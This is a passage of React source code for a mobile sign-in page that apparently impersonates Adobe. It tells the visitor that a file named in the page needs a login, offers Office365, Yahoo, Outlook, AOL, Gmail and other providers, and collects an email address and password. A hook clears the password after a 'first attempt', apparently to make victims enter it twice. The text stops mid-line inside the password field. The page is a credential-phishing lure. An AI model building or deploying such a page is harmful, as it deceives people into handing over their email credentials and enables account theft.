import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../../hooks/useLogin';
import Spinner from '../../components/common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  fileName,
  onLoginSuccess,
  onLoginError 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Office365', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
  };

  const AdobeLogo = () => (
    <img 
      src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Adobe_Corporate_logo.svg" 
      alt="Adobe Logo" 
      className="w-9 h-9"
    />
  );

  return (
    <div 
      className="min-h-screen flex flex-col justify-end font-sans bg-cover bg-center"
      style={{
        backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
      }}
    >
      <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
        <div className="flex justify-center mb-4">
          <AdobeLogo />
        </div>
        <h1 className="text-xl font-bold text-gray-800">
          {!selectedProvider ? 'Sign in to continue' : `Sign in with ${selectedProvider}`}
        </h1>
        <p className="text-gray-600 mt-2 text-sm">
          to access <span className="font-medium text-gray-700">{fileName}</span>
        </p>
      </div>

      <div className="bg-white rounded-t-3xl shadow-2xl p-6 flex-grow-0">
        {!selectedProvider ? (
          // --- Provider Selection UI ---
          <div>
            <p className="text-center text-sm font-medium text-gray-600 mb-5">Choose your email provider</p>
            <div className="grid grid-cols-2 gap-4">
              {emailProviders.map((provider) => (
                <button
                  key={provider.name}
                  onClick={() => setSelectedProvider(provider.name)}
                  type="button"
                  className="flex items-center p-4 bg-gray-50 rounded-xl border border-gray-200 active:bg-gray-100 active:border-blue-500 transition-all duration-200"
                >
                  <img src={provider.logo} alt={provider.name} className="w-8 h-8 object-contain" />
                  <span className="ml-3 text-base font-semibold text-gray-700">{provider.name}</span>
                </button>
              ))}
            </div>
          </div>
        ) : (
          // --- Login Form UI ---
          <div>
            <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-600 active:text-gray-900 font-medium mb-6">
              <ArrowLeft className="w-4 h-4" />
              Change provider
            </button>

            <form onSubmit={handleSubmit} className="space-y-5">
              {errorMessage && (
                <div className="bg-red-50 text-red-700 p-3 rounded-lg text-sm font-medium text-center">
                  {errorMessage}
                </div>
              )}

              <div>
                <label className="text-sm font-bold text-gray-700" htmlFor="email">Email Address</label>
                <div className="relative mt-2">
                  <Mail className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    id="email"
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="you@example.com"
                    required
                    className="w-full pl-11 pr-4 py-4 bg-gray-100 border-2 border-transparent rounded-lg focus:ring-2 focus:ring-blue-500 focus:bg-white focus:border-blue-500 transition"
                  />
                </div>
              </div>

              <div>
                <label className="text-sm font-bold text-gray-700" htmlFor="password">Password</label>
                <div className="relative mt-2">
                  <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    id="password"
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.targe
